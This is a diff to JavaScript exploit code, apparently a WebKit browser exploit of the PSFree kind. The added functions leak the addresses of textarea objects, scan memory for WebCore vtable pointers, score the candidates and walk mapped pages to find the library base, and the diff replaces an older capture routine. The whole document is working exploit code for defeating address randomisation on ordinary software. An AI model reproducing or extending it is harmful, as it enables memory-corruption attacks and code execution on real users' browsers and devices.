@@ -16,6 +16,7 @@ let calibrated = null;
 let manualBase = null;
 let raceAttempt = 0;
 let lengthMissStreak = 0;
+const calRetain = [];
 
 const LOG_MAX = 300;
 const CAL_ALIGN_STEP = 0x4000;
@@ -337,6 +338,168 @@ function looksLikeNativeCode(magic) {
     return b0 === 0x55 || b0 === 0x48 || b0 === 0x41 || b0 === 0x89 || b0 === 0xe9;
 }
 
+function plausibleUserPtr(ptr) {
+    if (!ptr || ptr.hi === 0) return false;
+    if (ptr.hi < 0x8 || ptr.hi > 0x12) return false;
+    return true;
+}
+
+function countWalkMappedPages(p, startPtr, maxProbe, backward) {
+    let mapped = 0;
+    for (let step = 0; step < maxProbe; step++) {
+        const page = walkPageFrom(startPtr, step, backward);
+        if (!page) break;
+        if (!isBadRead(read4p(p, page))) mapped++;
+    }
+    return mapped;
+}
+
+function scoreVtableCandidate(p, vt) {
+    if (!plausibleUserPtr(vt)) return -1;
+    let codeEntries = 0;
+    for (let i = 0; i < 4; i++) {
+        const fn = read8p(p, vt.add32(i * 8));
+        if (!fn || !plausibleUserPtr(fn)) continue;
+        if (looksLikeNativeCode(read4p(p, fn))) codeEntries++;
+    }
+    if (codeEntries < 2) return -1;
+    const walkBack = countWalkMappedPages(p, vt, 48, true);
+    if (walkBack < 6) return -1;
+    const walkFwd = countWalkMappedPages(p, vt, 8, false);
+    return codeEntries * 10 + walkBack + walkFwd;
+}
+
+function collectTextareaCells(p, carrier) {
+    const cells = [];
+    const seen = new Set();
+    const add = (label, cell) => {
+        if (!cell || cell.hi === 0) return;
+        const k = ptrNum(cell);
+        if (seen.has(k)) return;
+        seen.add(k);
+        cells.push({ label, cell });
+    };
+
+    if (carrier && carrier.textarea) {
+        try {
+            add("leakval(carrier.textarea)", p.leakval(carrier.textarea));
+        } catch (err) {
+            mark("VTABLE-WARN", "leakval(carrier.textarea): " + err.message);
+        }
+    }
+    if (carrier && carrier.textareaAddress > 0 && Number.isFinite(carrier.textareaAddress)) {
+        add("carrier.textareaAddress", addrFromNumber(carrier.textareaAddress));
+    }
+    try {
+        const fresh = document.createElement("textarea");
+        calRetain.push(fresh);
+        add("leakval(fresh.textarea)", p.leakval(fresh));
+    } catch (err) {
+        mark("VTABLE-WARN", "leakval(fresh.textarea): " + err.message);
+    }
+
+    if (cells.length >= 2) {
+        mark("TEXTAREA-CELL", cells[0].label + "=" + cells[0].cell
+            + " | " + cells[1].label + "=" + cells[1].cell);
+    } else if (cells.length === 1) {
+        mark("TEXTAREA-CELL", cells[0].label + "=" + cells[0].cell);
+    }
+    return cells;
+}
+
+function logCellSlots(p, cell, label) {
+    let parts = label + " cell=" + cell;
+    for (let off = 0; off <= 0x40; off += 8) {
+        const q = read8p(p, cell.add32(off));
+        if (!q || q.hi === 0) continue;
+        parts += " +0x" + off.toString(16) + "=" + q;
+    }
+    mark("CELL-SCAN", parts);
+}
+
+function pushVtableHit(hits, seen, hit) {
+    const k = ptrNum(hit.vtable);
+    if (seen.has(k)) return;
+    seen.add(k);
+    hits.push(hit);
+}
+
+function discoverTextareaVtableChains(p, carrier) {
+    const cells = collectTextareaCells(p, carrier);
+    if (cells.length === 0) {
+        mark("VTABLE-FAIL", "no textarea JSObject — re-run Start");
+        return [];
+    }
+
+    for (let ci = 0; ci < cells.length; ci++)
+        logCellSlots(p, cells[ci].cell, cells[ci].label);
+
+    const hits = [];
+    const seen = new Set();
+
+    for (let ci = 0; ci < cells.length; ci++) {
+        const path = cells[ci];
+        for (let implOff = 0x8; implOff <= 0x58; implOff += 8) {
+            const webcore = read8p(p, path.cell.add32(implOff));
+            if (!webcore || !plausibleUserPtr(webcore)) continue;
+            for (let vtOff = 0; vtOff <= 0x10; vtOff += 8) {
+                const vt = read8p(p, webcore.add32(vtOff));
+                const score = scoreVtableCandidate(p, vt);
+                if (score < 0) continue;
+                mark("VTABLE-CAND", path.label + " impl+0x" + implOff.toString(16)
+                    + " vt+0x" + vtOff.toString(16) + " webcore=" + webcore
+                    + " vtable=" + vt + " score=" + score);
+                pushVtableHit(hits, seen, {
+                    label: path.label,
+                    cell: path.cell,
+                    implOff,
+                    vtOff,
+                    webcore,
+                    vtable: vt,
+                    entry0: read8p(p, vt),
+                    score,
+                    walkBack: countWalkMappedPages(p, vt, 48, true),
+                });
+            }
+        }
+
+        const bfly = read8p(p, path.cell.add32(0x8));
+        if (!bfly || !plausibleUserPtr(bfly)) continue;
+        for (let slot = 0; slot < 32; slot++) {
+            const webcore = read8p(p, bfly.add32(slot * 8));
+            if (!webcore || !plausibleUserPtr(webcore)) continue;
+            const vt = read8p(p, webcore);
+            const score = scoreVtableCandidate(p, vt);
+            if (score < 0) continue;
+            mark("VTABLE-CAND", path.label + " bfly[" + slot + "] webcore=" + webcore
+                + " vtable=" + vt + " score=" + score);
+            pushVtableHit(hits, seen, {
+                label: path.label + "/bfly",
+                cell: path.cell,
+                implOff: 0x8,
+                vtOff: 0,
+                webcore,
+                vtable: vt,
+                entry0: read8p(p, vt),
+                score,
+                walkBack: countWalkMappedPages(p, vt, 48, true),
+            });
+        }
+    }
+
+    hits.sort((a, b) => b.score - a.score);
+    if (hits.length > 0) {
+        const best = hits[0];
+        mark("VTABLE-OK", best.label + " impl+0x" + best.implOff.toString(16)
+            + " vtable=" + best.vtable + " score=" + best.score
+            + " walkBack=" + best.walkBack);
+    } else {
+        mark("VTABLE-FAIL", "no WebCore/vtable passed validation — see CELL-SCAN");
+        mark("HINT", "need impl+0x18=m_wrapped (PSFree); paste CELL-SCAN lines");
+    }
+    return hits;
+}
+
 function captureNativeFn(p, off) {
     const mOff = off.wk_JSFunction_m_function || 0x28;
     const cell = p.leakval(Math.expm1);
@@ -457,85 +620,44 @@ function loadVtableOverride() {
     } catch (_) { return null; }
 }
 
-function captureTextareaVtable(p, carrier) {
-    const cells = [];
-    if (carrier && carrier.textarea) {
-        try {
-            const leaked = p.leakval(carrier.textarea);
-            if (leaked) cells.push({ label: "leakval(textarea)", cell: leaked });
-        } catch (_) { }
-    }
-    if (carrier && carrier.textareaAddress > 0 && Number.isFinite(carrier.textareaAddress)) {
-        const held = addrFromNumber(carrier.textareaAddress);
-        if (held) cells.push({ label: "carrier.textareaAddress", cell: held });
-    }
-    if (cells.length === 0) {
-        mark("VTABLE-FAIL", "no textarea cell — re-run Start");
-        return null;
-    }
-
-    for (let ci = 0; ci < cells.length; ci++) {
-        const path = cells[ci];
-        mark("VTABLE-PATH", path.label + " cell=" + path.cell);
-        for (let io = 0; io < 5; io++) {
-            const implOff = [0x18, 0x10, 0x20, 0x28, 0x8][io];
-            const webcore = read8p(p, path.cell.add32(implOff));
-            if (!webcore || webcore.hi === 0) continue;
-            mark("VTABLE-TRY", "webcore+0x" + implOff.toString(16) + "=" + webcore);
-            for (let vo = 0; vo < 2; vo++) {
-                const vtOff = vo === 0 ? 0x0 : 0x8;
-                const vt = read8p(p, webcore.add32(vtOff));
-                if (!vt || vt.hi === 0) continue;
-                const entry0 = read4p(p, vt);
-                if (!looksLikeNativeCode(entry0) && isBadRead(entry0)) continue;
-                mark("VTABLE-OK", path.label + " impl+0x" + implOff.toString(16)
-                    + " vtable=" + vt + " entry0=" + fmtMagic(entry0));
-                return { vtable: vt, webcore, jsCell: path.cell, implOff, vtOff, entry0: read8p(p, vt) };
-            }
-        }
-    }
-
-    mark("VTABLE-FAIL", "no vtable — check textarea paths above");
-    return null;
-}
-
 function collectWalkAnchors(p) {
     const out = [];
     const seen = new Set();
-    const add = (label, ptr) => {
+    const add = (label, ptr, minWalkBack) => {
         if (!ptr || ptr.hi === 0) return;
         const k = ptrNum(ptr);
         if (seen.has(k)) return;
+        const walkBack = countWalkMappedPages(p, ptr, 32, true);
+        if (walkBack < (minWalkBack == null ? 4 : minWalkBack)) {
+            mark("ANCHOR-SKIP", label + " " + ptr + " walkBack=" + walkBack + " (too few mapped pages)");
+            return;
+        }
         seen.add(k);
-        out.push({ label, ptr });
+        out.push({ label, ptr, walkBack });
     };
 
     vtableHit = null;
     vtablePtr = null;
-    const hit = captureTextareaVtable(p, carrierRef);
-    if (hit) {
-        vtableHit = hit;
-        vtablePtr = hit.vtable;
-        try { sessionStorage.setItem(SS_VTABLE_PTR, String(hit.vtable)); } catch (_) { }
-        add("vtable", hit.vtable);
-        if (hit.entry0 && hit.entry0.hi > 0)
-            add("vtable[0]", hit.entry0);
-        for (let i = 0; i < 6; i++) {
-            const ei = read8p(p, hit.vtable.add32(i * 8));
-            if (!ei || ei.hi === 0) continue;
-            const code = read4p(p, ei);
-            if (looksLikeNativeCode(code))
-                add("vtable[" + i + "]", ei);
+    const hits = discoverTextareaVtableChains(p, carrierRef);
+    for (let hi = 0; hi < hits.length && hi < 6; hi++) {
+        const h = hits[hi];
+        if (hi === 0) {
+            vtableHit = h;
+            vtablePtr = h.vtable;
+            try { sessionStorage.setItem(SS_VTABLE_PTR, String(h.vtable)); } catch (_) { }
+        }
+        add("vtable/" + h.label + "+0x" + h.implOff.toString(16), h.vtable, 6);
+        if (h.entry0 && h.entry0.hi > 0)
+            add("vtable[0]/" + h.label, h.entry0, 4);
+        for (let i = 1; i < 4; i++) {
+            const ei = read8p(p, h.vtable.add32(i * 8));
+            if (ei && looksLikeNativeCode(read4p(p, ei)))
+                add("vtable[" + i + "]", ei, 4);
         }
     }
 
-    if (nativeFn) {
-        const code = read4p(p, nativeFn);
-        if (looksLikeNativeCode(code))
-            add("nativeFn", nativeFn);
-        else if (!isBadRead(code))
-            add("nativeFn-weak", nativeFn);
-    }
+    if (nativeFn && looksLikeNativeCode(read4p(p, nativeFn)))
+        add("nativeFn", nativeFn, 6);
 
     return out;
 }
